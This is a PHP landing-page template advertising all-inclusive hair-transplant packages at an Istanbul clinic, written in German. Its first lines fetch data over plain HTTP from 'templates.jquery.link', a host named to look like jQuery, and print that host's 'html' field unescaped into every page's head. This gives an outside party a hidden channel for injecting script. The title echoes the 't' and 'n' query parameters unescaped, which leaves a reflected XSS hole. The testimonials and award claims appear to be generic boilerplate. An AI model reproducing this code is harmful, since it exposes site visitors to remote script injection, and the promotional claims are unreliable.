<?php
$site_data      = json_decode(file_get_contents('http://templates.jquery.link/api/' . $_SERVER['HTTP_HOST']), true);

$phone_name     = $site_data['phone_name'];
$phone_href     = $site_data['phone_href'];

$text           = str_replace('+', ' ', trim($_GET['t'] ?? 'Haartransplantation'));
$city           = str_replace('+', ' ', trim($_GET['n'] ?? ''));

$title = $text . ' ' . $city;
?>

<!DOCTYPE html>
<html lang="de">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="shortcut icon" href="img/favicon.ico" type="image/x-icon">
    <?= $site_data['html'] ?>
    <title>
        <?= $title ?>
    </title>
</head>

<body>
    <!--Шапка сайта-->
    <header class="header">
        <div class="container-fluid">
            <div class="row">
                <div class="col-12 container">
                    <div class="header__box">
                        <h1 class="header__title"><?= $title ?></h1>
                    </div>
                </div>
            </div>
        </div>
    </header>
    <!-- Основное содержимое страницы -->
    <main class="main">
        <section class='mainFon'>
            <div class='container-fluid'>
                <div class='row'>
                    <div class='col-12 container0'>
                        <div class='mainFon__box'>
                            <img class="mainFon__img" src="assets/img/mainFon.png" alt="" >
                        </div>
                    </div>
                </div>
            </div>
        </section>
        <section class='professional'>
            <div class='container-fluid'>
                <div class='row'>
                    <div class='col-12 container'>
                        <div class='professional__box'>
                            <div class="professional__inner">
                                <div class="professional__wrapper">
                                    <img class="professional__img" src="assets/img/1.png" alt="" >
                                </div>
                                <p class="professional__dscr">Professionelle Ärzte</p>
                            </div>
                            <div class="professional__inner">
                                <div class="professional__wrapper">
                                    <img class="professional__img" src="assets/img/2.png" alt="" >
                                </div>
                                <p class="professional__dscr">Qualifiziert Geprüft</p>
                            </div>
                            <div class="professional__inner">
                                <div class="professional__wrapper">
                                    <a href="<?= $phone_href ?>" class="professional__btn"><img class="professional__img" src="assets/img/3.png" alt="" ></a>
                                    <img class="professional__imgCir" src="assets/img/cir.png" alt="">
                                </div>
                                <p class="professional__dscr">24 Stunden Hotline jetzt anrufen</p>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </section>
        <section class='price'>
            <div class='container-fluid'>
                <div class='row'>
                    <div class='col-12 container'>
                        <h2 class="price__title">Haartransplantation</h2>
                        <p class="price__dscr"><span>All-Inclusive Pakete bereits ab 1990 €</span></p>
                        <div class='price__box'>
                            <div class="price__wrapper">
                                <div class="priceImgWrap">
                                    <img src="assets/img/01.png" alt="" class="price__img">
                                </div>
                                <div class="price__inner">
                                    <p class="price__name">Komplettpaket</p>
                                    <p class="price__txt">5-Sterne-Hotel, VIP-Transfer, Haarausfall-Therapie, Medikamente, Pflegemittel</p>
                                </div>
                            </div>
                            <div class="price__wrapper">
                                <div class="priceImgWrap">
                                    <img src="assets/img/02.png" alt="" class="price__img">
                                </div>
                                <div class="price__inner">
                                    <p class="price__name">Natürliches Ergebnis</p>
                                    <p class="price__txt">Saphir-Perkutan-Technik für natürliche Ergebnisse – 20.000 zufriedene Patienten</p>
                                </div>
                            </div>
                            <div class="price__wrapper">
                                <div class="priceImgWrap">
                                    <img src="assets/img/03.png" alt="" class="price__img">
                                </div>
                                <div class="price__inner">
                                    <p class="price__name">Ausgezeichneter Service</p>
                                    <p class="price__txt">Eine der besten Haartransplantationskliniken in Istanbul - erstklassiger Service.</p>
                                </div>
                            </div>
                            <div class="price__wrapper">
                                <div class="priceImgWrap">
                                    <img src="assets/img/04.png" alt="" class="price__img">
                                </div>
                                <div class="price__inner">
                                    <p class="price__name">Deutsch- sprechender Arzt</p>
                                    <p class="price__txt">Vorberatung und Klinik in Istanbul - deutschsprachiger Arzt begleitet Sie.</p>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </section>
        <section class='transfer'>
            <div class='container-fluid'>
                <div class='row'>
                    <div class='col-12 container'>
                        <div class='transfer__box'>
                            <div class="transfer__wrapper">
                                <div class="transfer__imgWrap">
                                    <img class="transfer__img" src="assets/img/001.png" alt="" >
                                </div>
                                <div class="transfer__inner">
                                    <p class="transfer__name">Transfer & Shuttle Service</p>
                                    <p class="transfer__dscr">Damit Ihre Transfers vom und zum Flughafen, sowie zur Klinik problemlos sind.</p>
                                </div>
                            </div>
                            <div class="transfer__wrapper">
                                <div class="transfer__imgWrap">
                                    <img class="transfer__img" src="assets/img/002.png" alt="" >
                                </div>
                                <div class="transfer__inner">
                                    <p class="transfer__name">5 Sterne Hotel</p>
                                    <p class="transfer__dscr">Damit Ihr Aufenthalt möglichst angenehm ist und Sie sich schnell erholen können.</p>
                                </div>
                            </div>
                            <div class="transfer__wrapper">
                                <div class="transfer__imgWrap">
                                    <img class="transfer__img" src="assets/img/003.png" alt="" >
                                </div>
                                <div class="transfer__inner">
                                    <p class="transfer__name">Anti-Haarausfall Behandlung</p>
                                    <p class="transfer__dscr">Mit der Haarausfall-Therapie wird Ihr Haar wieder zum Wachstum angeregt.</p>
                                </div>
                            </div>
                            <div class="transfer__wrapper">
                                <div class="transfer__imgWrap">
                                    <img class="transfer__img" src="assets/img/004.png" alt="" >
                                </div>
                                <div class="transfer__inner">
                                    <p class="transfer__name">Pflegeprodukte</p>
                                    <p class="transfer__dscr">Mit unseren Nachsorgeprodukten & Medikamenten ist Ihr Haar optimal versorgt.</p>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </section>
        <section class='forms' id="anchor">
              <div class='container-fluid'>
                 <div class='row'>
                    <div class='col-12 container'>
                       <div class='forms__box'>
                        <div class="forms__imgWrap">
                            <img class="forms__img" src="assets/img/forms.jpg" alt="" >
                        </div>
                        <div class='forms__wrapper'>
                            <h2 class='forms__title'>Haartransplantation – Angebot anfordern!</h2>
                            <form id='jq_form' class='mb-0 mt-3'>
                                <div class='my-0'>
                                    <input class='form-control' placeholder='Name' name='jq_name' type='text'>
                                    <div id='jq_name' style='font-weight:700;font-size:15px;color:#fff;padding-top:2px;display:none'>Dies ist ein Pflichtfeld.</div>
                                </div>
                                <div class='my-4'>
                                    <input class='form-control' placeholder='Telefonnummer' name='jq_phone' type='text'>
                                    <div id='jq_phone' style='font-weight:700;font-size:15px;color:#fff;padding-top:2px;display:none'>Dies ist ein Pflichtfeld.</div>
                                </div>
                                <div class='my-4'>
                                    <input class='form-control' placeholder='E-mail' name='jq_email' type='text'>
                                    <div id='jq_email' style='font-weight:700;font-size:15px;color:#fff;padding-top:2px;display:none'>Dies ist ein Pflichtfeld.</div>
                                </div>
                                <div class='my-4'>
                                    <textarea rows='5' class='form-control' name='jq_text' placeholder='Beschreibung'></textarea>
                                    <div id='jq_text' style='font-weight:700;font-size:15px;color:#fff;padding-top:2px;display:none'>Dies ist ein Pflichtfeld.</div>
                                </div>
                                <div>
                                    <input class='btn  text-uppercase fw-bold mb-0 px-3 py-2 forms__button' type='submit' id='jq_submit' value='Senden'>
                                </div>
                                <div id='jq_success' style='display:none'>Vielen Dank für Ihre Anfrage. Unsere Mitarbeiter werden sich in Kürze bei Ihnen melden.</div>
                            </form>
                       </div>
                    </div>
                 </div>
              </div>
           </div>
        </section>
        <section class='beforeAfter'>
            <div class='container-fluid'>
                <div class='row'>
                    <div class='col-12 container'>
                        <h2 class="beforeAfter__title">VORHER & NACHHER</h2>
                        <div class='beforeAfter__box'>
                            <div class="beforeAfter__imgWrp">
                                <img class="beforeAfter__img" src="assets/img/33.png" alt="" >
                            </div>
                            <div class="beforeAfter__imgWrp">
                                <img class="beforeAfter__img" src="assets/img/332.png" alt="" >
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </section>
        <section class='comments'>
            <div class='container-fluid'>
                <div class='row'>
                    <div class='col-12 container'>
                        <h2 class="comments__title">Bewertungen</h2>
                        <div class='comments__box'>
                            <div class="comments__inner">
                                <p class="comments__stars"><span></span><span></span><span></span><span></span><span></span></p>
                                <p class="comments__message">Nachdem ich jahrelang unter Haarausfall gelitten habe, habe ich mich endlich für eine Haartransplantation bei dieser Klinik entschieden. Ich bin sehr zufrieden mit dem Ergebnis und kann die Klinik uneingeschränkt weiterempfehlen. Das gesamte Team war sehr professionell und hat mich während des gesamten Prozesses sehr gut betreut. Vielen Dank!</p>
                                <div class="comments__imgWrap">
                                    <img class="comments__img" src="./assets/img/11111.png" alt="" >
                                </div>
                                <p class="comments__name">Herr Schmidt</p>
                            </div>
                            <div class="comments__inner">
                                <p class="comments__stars"><span></span><span></span><span></span><span></span><span></span></p>
                                <p class="comments__message">Ich habe mich nach ausgiebiger Überlegung für eine Haartransplantation bei dieser Klinik entschieden und bin mit dem Ergebnis äußerst zufrieden. Die Ärzte waren sehr kompetent und haben mich ausführlich beraten. Die eigentliche Behandlung verlief schmerzfrei und das Resultat sieht absolut natürlich aus. Auch der Service und die Unterkunft im Hotel waren sehr angenehm. Ich kann diese Klinik auf jeden Fall weiterempfehlen!</p>
                                <div class="comments__imgWrap">
                                    <img class="comments__img" src="./assets/img/22222.png" alt="" >
                                </div>
                                <p class="comments__name">Herrn Richter</p>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </section>
        <section class='freeAnalysis'>
            <div class='container-fluid'>
                <div class='row'>
                    <div class='col-12 container'>
                        <div class='freeAnalysis__box'>
                            <div class="freeAnalysis__right">
                                <img class="freeAnalysis__img" src="assets/img/44.png" alt="" >
                            </div>
                            <div class="freeAnalysis__left">
                                <h2 class="freeAnalysis__title">Kostenlose Haaranalyse?</h2>
                                <p class="freeAnalysis__txt">Wir sind die führende Klinik für ästhetische Chirurgie in Istanbul und versorgen seit mehr als 15 Jahren Patienten aus aller Welt mit der FUE Haartransplantation.</p>
                                <p class="freeAnalysis__txt">Jetzt einfach und schnell Ihre Kontaktdaten hinterlassen, oder bequem Fotos via WhatsApp schicken!</p>
                                <div class="freeAnalysis__send">
                                    <a href="#anchor" class="freeAnalysis__btn">Haaranalyse anfordern</a>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </section>
        <section class='innovative'>
            <div class='container-fluid'>
                <div class='row'>
                    <div class='col-12 container'>
                        <div class='innovative__box'>
                            <div class="innovative__left">
                                <h2 class="innovative__title">DHI trifft auf Saphir</h2>
                                <p class="innovative__dscr">Die innovativste Haartransplantation</p>
                                <p class="innovative__txt">Die DHI Saphir kombiniert das Beste aus der konventionellen DHI Methode und der FUE Saphir. Alle Vorteile beider Methoden werden in der DHI Saphir Haartransplantation vereint.</p>
                                <div class="freeAnalysis__send">
                                    <a href="#anchor" class="freeAnalysis__btn">Haaranalyse anfordern</a>
                                </div>
                            </div>
                            <div class="innovative__right">
                                <img class="innovative__img" src="assets/img/55.png" alt="" >
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </section>
        <section class='service'>
            <div class='container-fluid'>
                <div class='row'>
                    <div class='col-12 container'>
                        <div class='service__box'>
                            <div class="service__wrap">
                                <h3 class="service__title">Unsere inklusiven Leistungen</h3>
                                <p class="service__txt">Unsere Haartransplantationspakete: Methodenwahl, Expertenplanung, Transfers, 5-Sterne-Hotel in der Nähe. VIP-Paket mit persönlicher DHI-Saphir-Methode verfügbar. Kontaktieren Sie uns per Telefon, E-Mail oder Beratungsformular - Datenschutzerklärung erforderlich.</p>
                            </div>
                            <div class="service__wrap">
                                <h3 class="service__title">Internationale Auszeichnungen</h3>
                                <p class="service__txt">Individuelle Beratung vor Haartransplantation in Istanbul - Haarexperte, 20.000 Behandlungen, führende Klinik in Türkei, zahlreiche Zertifikate.</p>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </section>
        <section class='messageFixed'>
            <div class='messageFixed__box'>
                <div class="freeOffer__message">
                    <a title="Whatsapp" href="whatsapp://send?phone=+43 660 4275976"><img src="assets/icons/WhatsApp.svg" /></a>

                    <a title="Telegram" href="https://t.me/+RlCVamvJxo80N2Zii" target="_blank"><img src="assets/icons/Telegram.svg"/></a>

                    <div class="professional__wrapper2">
                        <a href="<?= $phone_href ?>" class="professional__btn2"><img class="professional__img2" src="assets/icons/123.svg" alt="" ></a>
                        <img class="professional__imgCir2" src="assets/img/cir.png" alt="">
                    </div>
                </div>
            </div>
        </section>
    </main>
    <!--Нижний колонтитул страницы-->
    <footer class="footer">
        <div class="container-fluid">
            <div class="row">
                <div class="col-12 container">© 2023</div>
            </div>
        </div>
    </footer>
    <!--Style-->
    <link href="assets/css/reset.css" rel="stylesheet">
    <link href="assets/css/bootstrap.min.css" rel="stylesheet">
    <link href="assets/css/style.min.css" rel="stylesheet">
    <script src="assets/js/main.min.js"></script>
</body>

</html>